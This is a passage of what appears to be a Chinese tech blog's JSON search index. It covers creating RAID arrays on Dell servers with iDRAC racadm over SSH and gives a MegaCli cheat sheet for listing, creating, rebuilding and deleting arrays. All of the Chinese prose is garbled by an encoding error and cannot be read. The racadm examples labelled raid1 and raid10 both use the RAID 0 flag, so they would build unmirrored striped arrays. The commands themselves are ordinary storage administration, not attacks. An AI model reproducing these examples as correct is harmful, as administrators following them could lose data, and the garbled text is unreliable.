ä¸‰ã€çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»åšå¥½çš„è™šæ‹Ÿç£ç›˜\nracadm\u0026gt;\u0026gt;storage get vdisks æ˜¾ç¤ºä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒå¤§èƒ†çš„å»åšäº†\nå››ã€åˆ’åˆ†RAID æ ¹æ®çº§åˆ«ä¸åŒï¼Œç²¾ç®€è¿‡çš„åä»¤å¦‚ä¸‹ï¼š\nracadm storage createvd:\u0026lt;æ§åˆ¶å™¨\u0026gt; -rl {r0|r1|r5|r6|r10|r50|r60} -pdkey:\u0026lt;ç£ç›˜ç»„ï¼Œç”¨é€—å·åˆ†å‰²\u0026gt; -rl â€” Sets the storage level. r0 â€” storage 0-Striping r1 â€” storage 1-Mirroring r5 â€” storage 5-Striping with Parity r6 â€” storage 6-Striping with Extra Parity r10 â€” storage 10-Spanned Striping with Mirroring r50 â€” storage 50-Spanned Striping with Parity r60 â€” storage 60-Spanned Striping with Extra Parity ç»™å‡ºä¾‹å­ï¼š\n#raid0 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 #raid1 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 #raid10 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 äº”ã€å»ºç«‹job é¦–å…ˆå°è¯•ä¸é‡å¯åœ¨çº¿å»ºRaidï¼š\nracadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 --realtime å¦‚æœä¸è¡Œï¼Œå°±å»ºç«‹é‡å¯çš„\nracadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 racadm jobqueue create RAID.Slot.1-1 RAC1024: Successfully scheduled a job. Verify the job status using \u0026#34;racadm jobqueue view -i JID_xxxxx\u0026#34; command. Commit JID = JID_222873363294 å…­ã€å¦‚æœè¦é‡å¯ï¼Œå°±é‡å¯ã€‚èƒ½åœ¨çº¿å»ºçš„å°±ä¸éœ€è¦é‡å¯\nracadm\u0026gt;\u0026gt;serveraction powercycle racadm serveraction powercycle Server power operation successful è¡¥å……ï¼š\nå¦‚æœè¦æ¸…ç†æ‰Raidå¡ä¹‹å‰çš„é…ç½®å®Œå…¨é‡å»ºï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\nstorage resetconfig:RAID.Slot.1-1 jobqueue create RAID.Slot.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA ","permalink":"https://rendoumi.com/posts/20221219-dell_ssh_raid/","summary":"\u003cp\u003eé¦–å…ˆsshåˆ°idracå»ï¼Œç›´æ¥ä¼šè¿›å…¥racadmçš„ç•Œé¢\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»¥2022å¹´æœ€æ–°çš„dellæœºå™¨ä¸ºä¾‹ï¼Œè€çš„æœºå™¨æ˜¾ç¤ºçš„ä¸œè¥¿ä¸ä¸€è‡´\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh 10.18.30.104\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œshellå‘½ä»¤æœ‰è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼ŒæŒ‰ä¸¤ä¸‹tabé”®ä¼šè‡ªåŠ¨è¡¥\u003c/p\u003e\n\u003cp\u003eåšraidçš„å…¨éƒ¨å‘½ä»¤éƒ½åœ¨storageçš„å­å‘½ä»¤ä¸‹\u003c/p\u003e\n\u003cp\u003eä¸€ã€é¦–å…ˆæ‹¿åˆ°raidå¡çš„åç§°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;storage get controllers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAHCI.Embedded.2-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAHCI.Embedded.1-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRAID.Slot.1-1 æ˜¯Raidå¡æ§åˆ¶å™¨åç§°ï¼Œä¸‹é¢ä¸¤ä¸ªæ˜¯ä¸»æ¿å†…ç½®çš„ï¼Œå¿½ç•¥ã€‚\u003c/p\u003e\n\u003cp\u003eäºŒã€ç„¶åæ‹¿åˆ°æ‰€æœ‰ç‰©ç†ç›˜çš„åç§°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;storage get pdisks\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»åšå¥½çš„è™šæ‹Ÿç£ç›˜\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eracadm\u0026gt;\u0026gt;storage get vdisks\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ˜¾ç¤ºä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒå¤§èƒ†çš„å»åšäº†\u003c/p\u003e\n\u003cp\u003eå››ã€åˆ’åˆ†RAID\næ ¹æ®çº§åˆ«ä¸åŒï¼Œç²¾ç®€è¿‡çš„åä»¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm storage createvd:\u0026lt;æ§åˆ¶å™¨\u0026gt; -rl \u003cspan class=\"o\"\u003e{\u003c/span\u003er0\u003cspan class=\"p\"\u003e|\u003c/span\u003er1\u003cspan class=\"p\"\u003e|\u003c/span\u003er5\u003cspan class=\"p\"\u003e|\u003c/span\u003er6\u003cspan class=\"p\"\u003e|\u003c/span\u003er10\u003cspan class=\"p\"\u003e|\u003c/span\u003er50\u003cspan class=\"p\"\u003e|\u003c/span\u003er60\u003cspan class=\"o\"\u003e}\u003c/span\u003e -pdkey:\u0026lt;ç£ç›˜ç»„ï¼Œç”¨é€—å·åˆ†å‰²\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rl â€” Sets the storage level.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r0 â€” storage 0-Striping\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r1 â€” storage 1-Mirroring\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r5 â€” storage 5-Striping with Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r6 â€” storage 6-Striping with Extra Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r10 â€” storage 10-Spanned Striping with Mirroring\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r50 â€” storage 50-Spanned Striping with Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r60 â€” storage 60-Spanned Striping with Extra Parity\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç»™å‡ºä¾‹å­ï¼š\u003c/p\u003e","title":"DellæœåŠ¡å™¨ç”¨sshæ–¹å¼åˆ’åˆ†ç£ç›˜Raidçš„æ–¹æ³•"},{"content":"è¿™Megacliæ˜¯æ“ä½œç£ç›˜Raidçš„å¸¸ç”¨è½¯ä»¶ï¼Œæ—¥å¸¸ç”¨çš„å¤§å¤šæ˜¯dellå®¶çš„æœºå™¨ï¼Œéƒ½æ˜¯è¿™è½¯ä»¶ï¼Œè®°å½•ä¸€ä¸‹ã€‚\n#!/bin/sh #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 | grep -A1 \u0026#34;Enclosure Device\u0026#34; # clear foreign disk #/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0 #/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0 # clear Firmware state #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39; #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv \u0026#34;[32:3]\u0026#34; -a0 # clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39; #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0 #/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL #/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1 -a0 #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0 # create Raid0 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0 # Get old Cache, ex: Virtual Drive(Target ID 02) #/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0 # Clear cache, ex: Virtual Drive(Target ID 02) #/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0 # create Raid1 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0 # create Raid5 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0 # create Raid10 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0 #delete raid #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0 #Virtual Drive: 0 (Target Id: 0) # check Raid #/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL #RAID 1 #RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0 #RAID 5 #RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3 # check Raid disks #/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep \u0026#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:\u0026#34; # GPT part #parted -s /dev/sde mklabel gpt mkpart primary 0% 100% # check disk rebuild progress #/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -physdrv[32:1] -aALL #Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes. # Force rebuild #/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -physdrv[32:1] -a0 # OR #/opt/MegaRAID/MegaCli/MegaCli64 -pdlocate -start -physdrv[32:1] -a0 #Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed) #/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL #set global hostspare #/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0 #If you need to unset/remove a global hotspare: #/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN #downgrade raid6 --\u0026gt; raid5 ,and more space now can be used # -L0 virtual disk 0 # /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0 # echo 1 \u0026gt; /sys/block/sda/device/rescan #Add disk to a raid5 #/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a #Configure WriteThrough or WriteBack #/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll #/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep \u0026#34;Inquiry Data:\u0026#34; #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04B0C #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AFD #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04JAY #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AAG #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL | grep \u0026#34;Drive Temperature\u0026#34; #Drive Temperature :36C (96.80 F) #Drive Temperature :35C (95.00 F) ","permalink":"https://rendoumi.com/posts/20221217-megacli/","summary":"\u003cp\u003eè¿™Megacliæ˜¯æ“ä½œç£ç›˜Raidçš„å¸¸ç”¨è½¯ä»¶ï¼Œæ—¥å¸¸ç”¨çš„å¤§å¤šæ˜¯dellå®¶çš„æœºå™¨ï¼Œéƒ½æ˜¯è¿™è½¯ä»¶ï¼Œè®°å½•ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -A1 \u003cspan class=\"s2\"\u003e\u0026#34;Enclosure Device\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear foreign disk \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear Firmware state\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv \u0026#34;[32:3]\u0026#34; -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1  -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid0 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Get old Cache, ex: Virtual Drive(Target ID 02)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Clear cache, ex: Virtual Drive(Target ID 02)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid1 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#delete raid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Virtual Drive: 0 (Target Id: 0)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check Raid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID 5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID Level          : Primary-5, Secondary-0, RAID Level Qualifier-3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check Raid disks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep \u0026#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# GPT part\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#parted -s /dev/sde mklabel gpt mkpart primary 0% 100%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check disk rebuild progress\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -ShowProg -physdrv[32:1] -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Force rebuild\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -Start -physdrv[32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OR\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -pdlocate -start -physdrv[32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#set global hostspare\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#If you need to unset/remove a global hotspare:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 